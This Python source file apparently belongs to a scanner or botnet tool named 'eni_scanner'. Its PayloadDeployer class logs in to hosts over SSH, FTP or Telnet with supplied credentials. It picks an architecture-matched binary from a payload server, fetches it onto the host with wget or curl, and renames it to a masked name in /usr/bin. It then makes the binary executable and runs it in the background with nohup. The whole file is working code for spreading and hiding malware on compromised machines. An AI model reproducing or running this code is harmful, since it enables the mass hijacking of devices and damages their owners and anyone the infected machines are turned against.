import asyncio
import ftplib
import urllib.request
import logging
import os
import socket
import time
import paramiko
import aiohttp

from .config import CONFIG

logger = logging.getLogger('eni_scanner')

class PayloadDeployer:
    def __init__(self, args, db=None, session: aiohttp.ClientSession = None):
        self.args = args
        self.db = db
        self.session = session
        self.payload_server = args.payload_server.rstrip('/')
        self.payload_type = args.payload_type
        self.base_remote_path = args.payload_path if args.payload_path else CONFIG['deploy']['remote_path']
        self.fallback_paths = CONFIG['deploy']['fallback_paths']
        self.mask_name = CONFIG['deploy']['mask_name']
        self.paths_by_arch = CONFIG['deploy']['paths_by_arch']
        self.payloads = {
            "x86_64":   f"{self.payload_server}/payloads/{self.payload_type}_x86_64",
            "x86":      f"{self.payload_server}/payloads/{self.payload_type}_i686",
            "arm":      f"{self.payload_server}/payloads/{self.payload_type}_armv7",
            "aarch64":  f"{self.payload_server}/payloads/{self.payload_type}_aarch64",
            "mips":     f"{self.payload_server}/payloads/{self.payload_type}_mips",
            "powerpc":  f"{self.payload_server}/payloads/{self.payload_type}_ppc",
            "unknown":  f"{self.payload_server}/payloads/{self.payload_type}_generic"
        }

    async def _payload_exists(self, url: str) -> bool:
        try:
            async with self.session.head(url, timeout=5) as resp:
                return resp.status == 200
        except Exception:
            return False

    def _get_remote_path(self, arch: str) -> str:
        return self.paths_by_arch.get(arch, self.paths_by_arch.get('default', self.base_remote_path))

    async def deploy(self, ip, port, service, username, password, arch) -> bool:
        url = self.payloads.get(arch, self.payloads["unknown"])
        if not await self._payload_exists(url):
            logger.error("Payload not found on server: %s", url)
            return False
        remote_path = self._get_remote_path(arch)
        logger.info("Deploying %s to %s:%d (arch=%s, url=%s, path=%s)",
                    self.payload_type, ip, port, arch, url, remote_path)
        if service == "ssh":
            return await self._via_ssh(ip, port, username, password, url, remote_path)
        elif service == "ftp":
            return await self._via_ftp(ip, port, username, password, url, remote_path)
        elif service == "telnet":
            return await self._via_telnet(ip, port, username, password, url, remote_path)
        else:
            logger.warning("Unsupported service for deployment: %s", service)
            return False

    async def _via_ssh(self, ip, port, user, pwd, url, remote_path):
        loop = asyncio.get_running_loop()
        def _ssh_exec():
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                client.connect(ip, port=port, username=user, password=pwd, timeout=10)
                # Check for wget/curl
                stdin, stdout, stderr = client.exec_command("which wget || which curl")
                downloader = stdout.read().decode().strip().split('\n')[0].split('/')[-1]
                if not downloader:
                    logger.error("No wget or curl found on %s", ip)
                    return False
                if downloader == "wget":
                    download_cmd = f"wget -q {url} -O {remote_path}"
                else:
                    download_cmd = f"curl -s {url} -o {remote_path}"
                stdin, stdout, stderr = client.exec_command(download_cmd, timeout=30)
                stdout.channel.recv_exit_status()
                # Check size
                stdin, stdout, stderr = client.exec_command(f"stat -c %s {remote_path} 2>/dev/null || echo 0")
                size_str = stdout.read().decode().strip()
                try:
                    size = int(size_str)
                    if size < 1000:
                        logger.error("Payload size too small (%d bytes)", size)
                        return False
                except:
                    pass
                # Masking
                masked_path = f"/usr/bin/{self.mask_name}"
                client.exec_command(f"mv {remote_path} {masked_path} 2>/dev/null || cp {remote_path} {masked_path}")
                client.exec_command(f"chmod +x {masked_path}")
                client.exec_command(f"nohup {masked_path} >/dev/null 2>&1 &")
                return True
            except Exception as e:
                logger.debug("SSH deploy error: %s", e)
                return False
            finally:
                client.close()
        return await loop.run_in_executor(None, _ssh_exec)

    async def _via_ftp(self, ip, port, user, pwd, url, remote_path):
        loop = asyncio.get_running_loop()
        def _ftp_upload():
            try:
                payload_data = urllib.request.urlopen(url, timeout=10).read()
                ftp = ftplib.FTP()
                ftp.connect(ip, port, timeout=10)
                ftp.login(user, pwd)
                try:
                    ftp.storbinary(f"STOR {remote_path}", payload_data)
                except:
                    for path in self.fallback_paths:
                        try:
                            ftp.storbinary(f"STOR {path}", payload_data)
                            remote_path = path
                            break
                        except:
                            continue
                    else:
                        return False
                ftp.voidcmd(f"chmod +x {remote_path}")
                ftp.voidcmd(f"nohup {remote_path} &")
                ftp.quit()
                return True
            except Exception as e:
                logger.debug("FTP deploy error: %s", e)
                return False
        return await loop.run_in_executor(None, _ftp_upload)

    async def _via_telnet(self, ip, port, user, pwd, url, remote_path):
        loop = asyncio.get_running_loop()
        def _telnet_cmd():
            sock = socket.socket()
            sock.settimeout(10)
            try:
                sock.connect((ip, port))
                data = b""
                while b"login:" not in data:
                    chunk = sock.recv(256)
                    if not chunk:
                        return False
                    data += chunk
                sock.sendall(user.encode() + b"\n")
                data = b""
                while b"Password:" not in data:
                    chunk = sock.recv(256)
                    if not chunk:
                        return False
                    data += chunk
                sock.sendall(pwd.encode() + b"\n")
                time.sleep(1)
                sock.sendall(b"cd /tmp\n")
                sock.sendall(b"wget -q " + url.encode() + b" -O " + remote_path.encode() +
                             b" || curl -s " + url.encode() + b" -o " + remote_path.encode() + b"\n")
                sock.sendall(b"chmod +x " + remote_path.encode() + b"\n")
                sock.sendall(b"nohup " + remote_path.encode() + b" >/dev/null 2>&1 &\n")
                sock.sendall(b"exit\n")
                return True
            except Exception as e:
                logger.debug("Telnet deploy error: %s", e)
                return False
            finally:
                sock.close()
        return await loop.run_in_executor(None, _telnet_cmd)
